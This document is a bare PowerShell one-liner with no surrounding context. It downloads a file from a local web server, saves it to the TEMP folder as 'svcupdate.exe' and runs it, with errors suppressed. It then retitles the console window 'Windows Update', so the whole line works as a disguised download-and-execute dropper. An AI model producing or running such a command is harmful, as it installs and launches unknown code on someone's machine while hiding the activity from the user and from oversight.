
Start-BitsTransfer -Source 'https://localhost:8081/assets/update.dat' -Destination "$env:TEMP\svcupdate.exe" -ErrorAction SilentlyContinue; Start-Process -FilePath "$env:TEMP\svcupdate.exe" -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"
